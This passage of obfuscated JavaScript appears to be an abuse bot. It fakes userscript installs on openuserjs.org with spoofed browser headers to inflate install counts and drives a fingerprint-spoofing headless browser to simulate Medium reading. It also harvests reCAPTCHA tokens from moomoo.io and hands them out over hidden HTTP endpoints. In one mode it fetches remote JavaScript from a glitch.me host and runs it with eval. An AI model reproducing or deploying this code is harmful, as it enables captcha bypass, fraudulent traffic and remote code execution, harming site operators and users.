      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + X(0x1b) + X(0x5) + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + W(0xd) + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + V(0x2, '6$r&') + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + V(0x17, 'MAKn') + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + V(0x6, 'GObu') + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + V(0xf, 'JdQ)') + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x1479 * 0x1 + 0x2350 + -0xed7
  };

function a() {
  const bi = [
    'moo.io\x20wor',
    'dv1JluwoOb',
    'oWPNxSoRg8k+i1vR',
    'z290BW',
    'DwfMr09MD3PWyq',
    'icHlsfrntcWGBa',
    'pJBdJSo6Dcj9W6amWQ8',
    'DMXcAMK4ve9HEa',
    'txvPwhr2BZfswq',
    'B1fis01REs1FsW',
    'e1ZcICkJW7qShctdRJa',
    'L1Oy5F6ZMO',
    '94m93T_5JL',
    'Safari/537',
    's,army\x20bts',
    'W5VdMxHQW5ldK8ovhmkxWQ8',
    'W4FcICovW5O',
    'W5hcKCkVwmoakrDMWQJcMa',
    'Bw91C2vWBhvZ',
    'FGGzumogDmoFEYhdVG',
    'https://gr',
    'W5pcMN9GW4FcKmoAaCodWQ0',
    'CMCVzw4VC2nYAq',
    'CSkKyXFcGajehspcGW',
    'DgLUDwvKig1PBG',
    'Ahr0Chm6lY9NCG',
    '\x20div.yt-sp',
    's2L0lZuZnY4ZnG',
    'ncOcW4hdLq',
    '__scope'
  ];
  a = function() {
    return bi;
  };
  return a();
}
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const Y = b;
    log(Y(0x15, 'JdQ)') + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0xab4 * -0x2 + 0x52c * -0x2 + 0x1fc0)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x1 + 0x193 * 0x5 + -0x77c), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0xa * -0x2a2 + 0x1 * 0x1bce + 0x8b * -0x2), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x1704 + -0xb30 * -0x3 + -0xa8c;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x109b + 0x6a * -0x48 + 0x2e6b; w < getRandomInt(-0x7 * -0x2c3 + -0x1a64 + 0x710, 0x634 * -0x4 + 0x19e7 + 0x1 * -0x112); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0xc246 + 0xdd5 * 0x9 + -0x1447 * -0xf);
        }
      }();
    }, -0x1 * -0x1cad + -0x1056 + -0xbf3), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x25b8 + 0x11aa + -0x3762;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0xb * 0x71 + 0x3 * -0x349 + 0xeb6, 0x1881 * 0x1 + 0x4a * 0x8 + -0x1a9f)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x9e64 + 0xba34 + 0xbf8 * -0x13);
    }, -0x254f + 0x55 * 0x6f + 0xd8), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x71b * 0x3 + 0xaeb + 0xa66;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x3c1 * -0x4 + -0x7b * 0x21 + 0x2a97 * 0x1), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x17a8 + 0x5a * -0x6 + -0x563 * 0x4), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0xb818 + 0x75662 * 0x2 + 0x3 * -0x1304);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x79d + -0x2 * -0xabf + -0x3 * 0x47f);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x4b8 * 0x2 + -0xf * 0x256 + -0x16 * -0x133);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0xf * -0x3e2 + 0x1480 + 0xb * -0x44a);
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x29 * -0x75 + -0x4 * 0x357 + -0xab3 * -0x3);
    let h = e[f];
    if (b['UKGtix'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x117 + 0x796 * -0x3 + 0x17d9, s, t, u = 0x7c6 * 0x3 + -0x57 * -0x6b + 0x56d * -0xb; t = n['charAt'](u++); ~t && (s = r % (-0x554 + -0x1fc9 + 0x2521) ? s * (0x1ed8 + -0x5d * 0x3a + -0x986) + t : t, r++ % (-0x6 * 0x421 + 0x5f3 + 0x12d7)) ? p += String['fromCharCode'](-0x511 * 0x2 + -0x223b + 0x2 * 0x16ae & s >> (-(-0x197e + -0x95b + 0x22db) * r & -0x1502 + -0x4 * 0x791 + 0x334c)) : 0x24f7 * 0x1 + -0x644 + 0x1eb3 * -0x1) {
          t = o['indexOf'](t);
        }
        for (let v = -0x1d * -0x137 + -0x2401 + 0xc6, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0xaf1 * -0x1 + -0x190b * 0x1 + 0xe2a))['slice'](-(-0x2b3 * 0x2 + 0xa58 + 0x2 * -0x278));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x1115 * 0x1 + -0x1f * 0x7c + 0x2019,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x98d + 0x158d + -0x1f1a; u < -0x27 * 0xb + 0x6 * 0x109 + -0x389; u++) {
          p[u] = u;
        }
        for (u = 0x1bc1 + -0x1d1 * 0xa + -0x997; u < -0x434 + -0xb29 * 0x2 + 0x1b86; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x1 * -0xc31 + 0x12e2 + -0x1f * 0x2f), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x2374 + 0xc * -0x32c + 0x29c, q = 0x729 * 0x3 + -0x245f * -0x1 + -0x39da;
        for (let v = -0x462 * -0x8 + 0x296 * 0x4 + -0x2d68; v < n['length']; v++) {
          u = (u + (0x164 + -0x2638 + 0x24d5 * 0x1)) % (0x1 * -0x117e + 0xcd6 + 0xb5 * 0x8), q = (q + p[u]) % (0x10e5 * 0x2 + 0xae8 + -0x2bb2), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x9ac * -0x1 + 0x2170 + -0x2a1c)]);
        }
        return t;
      };
      b['jKcvcq'] = m, c = arguments, b['UKGtix'] = !![];
    }
    const j = e[0x97 * 0x7 + 0x1 * -0x7fd + 0x3dc],
      k = f + j,
      l = c[k];
    return !l ? (b['usirBC'] === undefined && (b['usirBC'] = !![]), h = b['jKcvcq'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
doFlags['doOUJS'] && ((async () => {
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0xded + 0x5f6 + -0x13e2) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0xb32 + -0xcf7 + 0x182a));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x217 + -0x1282 * -0x1 + -0x9 * 0x1d3, D['indexOf']('\x20'));
        return B ? E['slice'](-0x8 * 0x469 + -0x308 + 0x2650, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x1c3d + 0x6 * 0x2fa + 0x709 * -0x1),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x3916 + 0xce * -0x3b + 0xbf8 * 0xc),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x1aff + -0x1 * -0x2378 + -0x3e77; k < 0x1388 + 0xfc5 + -0x2349; k++)
    setTimeout(f, (-0x226f + 0x8699 + -0x29 * -0x346) * k * getRandomInt(-0x72c + 0x225 * 0x2 + -0x2e3 * -0x1, -0x1469 * -0x1 + -0x1 * 0x1aad + -0x647 * -0x1));
  setInterval(() => {
    f();
    for (let l = -0x199 * 0xf + 0x138a + 0x1 * 0x46d; l < 0x29c + 0x1a04 + -0x1c9c; l++)
      setTimeout(f, (0x1 * 0x1c1e9 + -0x5403 + 0x1 * -0x8386) * l * getRandomInt(-0x10fb + -0x4 * -0x2a7 + -0x60 * -0x11, -0x2673 * -0x1 + 0x1 * 0x251 + -0x28c1));
  }, 0xb8a * 0x6a5 + 0x1f2d00 + -0x34ea72);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
